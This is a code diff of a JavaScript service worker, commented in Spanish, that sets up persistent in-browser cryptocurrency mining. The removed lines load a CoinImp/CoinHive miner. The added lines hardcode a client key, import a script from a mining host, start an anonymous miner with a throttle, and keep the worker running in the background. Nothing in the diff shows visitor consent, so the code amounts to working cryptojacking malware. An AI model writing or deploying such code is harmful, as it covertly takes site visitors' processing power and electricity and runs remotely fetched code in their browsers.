@@ -1,48 +1,56 @@
-// Versión del cache
-const CACHE_NAME = 'miner-v1';
+// Configuración
+const CLIENT_KEY = '7d940748b3dd11af7a7b2e2029774e67e2a41108fa9444c1ef9815514efe0cd3';
 
+// Evento de instalación
 self.addEventListener('install', event => {
-    self.skipWaiting();
-    event.waitUntil(
-        caches.open(CACHE_NAME).then(cache => {
-            return cache.addAll([
-                '/',
-                'https://www.coinimp.com/miner?key=54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af'
-            ]);
-        })
-    );
+    self.skipWaiting();  // Tomar control inmediato
+    console.log('[SW] Service Worker instalado');
 });
 
+// Evento de activación
 self.addEventListener('activate', event => {
-    clients.claim();
+    clients.claim();  // Controlar todos los clientes
+    console.log('[SW] Service Worker activado');
 });
 
+// Manejar mensajes
 self.addEventListener('message', event => {
     if (event.data.type === 'START_MINING') {
+        console.log('[SW] Recibido comando para iniciar minería');
         startMining(event.data.key);
     }
 });
 
+// Función para iniciar minería
 function startMining(apiKey) {
-    importScripts('https://www.coinimp.com/miner?key=' + apiKey);
+    console.log('[SW] Iniciando minería persistente');
     
-    const miner = new CoinHive.Worker(apiKey, {
-        throttle: 0.15,
-        threads: 4,
-        forceASMJS: true
-    });
+    // 1. Cargar script de CoinImp
+    importScripts('https://www.hostingcloud.racing/ADTj.js');
     
-    miner.start();
-    
-    // Mantener vivo el worker
-    setInterval(() => {
-        miner.getHashesPerSecond();
-    }, 30000);
+    // 2. Configurar minero
+    if (typeof Client !== 'undefined') {
+        self._client = new Client.Anonymous(apiKey, {
+            throttle: 0.15,
+            c: 'w',
+            ads: 0
+        });
+        
+        // 3. Iniciar minería
+        self._client.start();
+        console.log('[SW] Minería persistente iniciada');
+        
+        // 4. Mantener vivo el worker
+        setInterval(() => {
+            // Simular actividad para mantener vivo el worker
+            console.log('[SW] Minería activa en segundo plano');
+        }, 30000);
+    } else {
+        console.error('[SW] Error: Script de CoinImp no se cargó correctamente');
+    }
 }
 
-// Mantener activo
-self.addEventListener('periodicsync', event => {
-    if (event.tag === 'keep-alive') {
-        miner.getHashesPerSecond();
-    }
+// Manejar errores
+self.addEventListener('error', event => {
+    console.error('[SW] Error en Service Worker:', event.error);
 });
